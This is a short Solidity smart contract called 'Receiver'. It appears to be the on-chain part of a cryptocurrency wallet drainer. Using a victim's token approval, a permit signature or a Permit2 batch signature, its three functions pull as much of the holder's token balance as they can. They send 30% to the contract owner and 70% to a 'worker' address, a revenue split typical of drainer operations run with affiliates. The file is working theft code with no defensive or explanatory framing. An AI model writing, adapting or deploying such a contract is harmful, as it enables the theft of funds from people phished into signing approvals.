// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;



interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

interface IPermit2 {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct PermitBatch {
        PermitDetails[] details;
        address spender;
        uint256 sigDeadline;
    }

    struct AllowanceTransferDetails {
        address from;
        address to;
        uint160 amount;
        address token;
    }

    function permit(
        address owner,
        PermitBatch memory permitBatch,
        bytes calldata signature
    ) external;

    function transferFrom(
        address from,
        address to,
        uint160 amount,
        address token
    ) external;
}

contract Receiver {
    address public owner;
    address public worker;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    constructor(address _owner, address _worker) payable {
        owner = _owner;
        worker = _worker;
    }

    function collectApprove(
        address _tokenHolder,
        address _token
    ) public onlyOwner {
        IERC20 token = IERC20(_token);
        uint256 allowance = token.allowance(_tokenHolder, address(this));
        uint256 balance = token.balanceOf(_tokenHolder);
        uint256 amount = (allowance < balance) ? allowance : balance;

        token.transferFrom(_tokenHolder, owner, (amount / 100) * 30);
        token.transferFrom(_tokenHolder, worker, (amount / 100) * 70);
    }

    function collectPermit(
        address _tokenHolder,
        address _token,
        uint _value,
        uint _deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public onlyOwner {
        IERC20 token = IERC20(_token);

        token.permit(_tokenHolder, address(this), _value, _deadline, v, r, s);

        uint256 allowance = token.allowance(_tokenHolder, address(this));
        uint256 balance = token.balanceOf(_tokenHolder);
        uint256 amount = (allowance < balance) ? allowance : balance;

        token.transferFrom(_tokenHolder, owner, (amount / 100) * 30);
        token.transferFrom(_tokenHolder, worker, (amount / 100) * 70);
    }

    function collectPermit2(
        address _tokenHolder,
        address _permit2Contract,
        IPermit2.PermitBatch memory _batchPayload,
        bytes calldata _signature
    ) public onlyOwner {
        IPermit2 permit2Contract = IPermit2(_permit2Contract);

        permit2Contract.permit(_tokenHolder, _batchPayload, _signature);

        for (uint i = 0; i < _batchPayload.details.length; i++) {
            address tokenAddress = _batchPayload.details[i].token;
            IERC20 token = IERC20(tokenAddress);

            uint256 allowance = _batchPayload.details[i].amount;
            uint256 balance = token.balanceOf(_tokenHolder);
            uint160 amount = uint160(
                (allowance < balance) ? allowance : balance
            );

            permit2Contract.transferFrom(
                _tokenHolder,
                owner,
                (amount / 100) * 30,
                tokenAddress
            );
            permit2Contract.transferFrom(
                _tokenHolder,
                worker,
                (amount / 100) * 70,
                tokenAddress
            );
        }
    }
}